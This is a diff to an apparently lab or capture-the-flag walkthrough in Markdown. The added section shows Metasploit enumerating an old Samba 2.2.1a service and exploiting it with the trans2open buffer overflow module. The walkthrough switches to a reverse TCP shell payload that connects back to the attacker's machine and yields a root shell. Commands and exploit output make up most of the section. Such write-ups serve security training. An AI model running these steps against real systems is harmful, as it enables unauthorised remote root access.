@@ -179,3 +179,115 @@ ptrace-kmod.c:183:1: warning: no newline at end of file
 whoami
 root
 ```
+
+## Second path
+### 2. Enumerate SMB
+Find the version using Metasploit.
+```bash
+msf5 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.1.1.63
+RHOSTS => 10.1.1.63
+msf5 auxiliary(scanner/smb/smb_version) > run
+
+[*] 10.1.1.63:139         - Host could not be identified: Unix (Samba 2.2.1a)
+[*] 10.1.1.63:445         - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution complete
+```
+The machine is running Samba 2.2.1a, which again is rather old - released 2001 in fact. Again, there are exploits available for it, and a prominant one which even has a Metasploit module for it exploiting the condition where the noexec option is not set for SMB, called the trans2open overflow.
+
+### 3. Get to root
+Try running the exploit as-is.
+```bash
+msf5 exploit(linux/samba/trans2open) > info
+
+       Name: Samba trans2open Overflow (Linux x86)
+     Module: exploit/linux/samba/trans2open
+   Platform: Linux
+       Arch: 
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Great
+  Disclosed: 2003-04-07
+
+Provided by:
+  hdm <x@hdm.io>
+  jduck <jduck@metasploit.com>
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Samba 2.2.x - Bruteforce
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+  RPORT   139              yes       The target port (TCP)
+
+Payload information:
+  Space: 1024
+  Avoid: 1 characters
+
+Description:
+  This exploits the buffer overflow found in Samba versions 2.2.0 to 
+  2.2.8. This particular module is capable of exploiting the flaw on 
+  x86 Linux systems that do not have the noexec stack option set. 
+  NOTE: Some older versions of RedHat do not seem to be vulnerable 
+  since they apparently do not allow anonymous access to IPC.
+
+References:
+  https://cvedetails.com/cve/CVE-2003-0201/
+  OSVDB (4469)
+  http://www.securityfocus.com/bid/7294
+  https://seclists.org/bugtraq/2003/Apr/103
+
+msf5 exploit(linux/samba/trans2open) > set RHOSTS 10.1.1.63
+RHOSTS => 10.1.1.63
+msf5 exploit(linux/samba/trans2open) > run
+
+[*] Started reverse TCP handler on 10.1.1.74:4444 
+[*] 10.1.1.63:139 - Trying return address 0xbffffdfc...
+[*] 10.1.1.63:139 - Trying return address 0xbffffcfc...
+[*] 10.1.1.63:139 - Trying return address 0xbffffbfc...
+[*] 10.1.1.63:139 - Trying return address 0xbffffafc...
+[*] Sending stage (980808 bytes) to 10.1.1.63
+[*] 10.1.1.63 - Meterpreter session 1 closed.  Reason: Died
+[*] Meterpreter session 1 opened (10.1.1.74:4444 -> 10.1.1.63:1025) at 2020-10-27 09:04:48 -0400
+[*] 10.1.1.63:139 - Trying return address 0xbffff9fc...
+[*] Sending stage (980808 bytes) to 10.1.1.63
+[*] Meterpreter session 2 opened (10.1.1.74:4444 -> 10.1.1.63:1026) at 2020-10-27 09:04:49 -0400
+[*] 10.1.1.63 - Meterpreter session 2 closed.  Reason: Died
+[*] 10.1.1.63:139 - Trying return address 0xbffff8fc...
+[*] Sending stage (980808 bytes) to 10.1.1.63
+[*] Meterpreter session 3 opened (10.1.1.74:4444 -> 10.1.1.63:1027) at 2020-10-27 09:04:50 -0400
+[*] 10.1.1.63 - Meterpreter session 3 closed.  Reason: Died
+[*] 10.1.1.63:139 - Trying return address 0xbffff7fc...
+[*] Sending stage (980808 bytes) to 10.1.1.63
+[*] 10.1.1.63 - Meterpreter session 4 closed.  Reason: Died
+[*] Meterpreter session 4 opened (10.1.1.74:4444 -> 10.1.1.63:1028) at 2020-10-27 09:04:51 -0400
+[*] 10.1.1.63:139 - Trying return address 0xbffff6fc...
+[*] 10.1.1.63:139 - Trying return address 0xbffff5fc...
+[*] 10.1.1.63:139 - Trying return address 0xbffff4fc...
+[*] 10.1.1.63:139 - Trying return address 0xbffff3fc...
+[*] 10.1.1.63:139 - Trying return address 0xbffff2fc...
+[*] 10.1.1.63:139 - Trying return address 0xbffff1fc...
+...
+```
+This fails, but that is because it is defaulting to a meterpreter payload. Instead the payload should be a basic reverse tcp shell.
+```bash
+msf5 exploit(linux/samba/trans2open) > set PAYLOAD linux/x86/shell_reverse_tcp
+PAYLOAD => linux/x86/shell_reverse_tcp
+msf5 exploit(linux/samba/trans2open) > run
+
+[*] Started reverse TCP handler on 10.1.1.74:4444 
+[*] 10.1.1.63:139 - Trying return address 0xbffffdfc...
+[*] 10.1.1.63:139 - Trying return address 0xbffffcfc...
+[*] 10.1.1.63:139 - Trying return address 0xbffffbfc...
+[*] 10.1.1.63:139 - Trying return address 0xbffffafc...
+[*] Command shell session 10 opened (10.1.1.74:4444 -> 10.1.1.63:1033) at 2020-10-27 09:13:43 -0400
+
+whoami
+root
+```
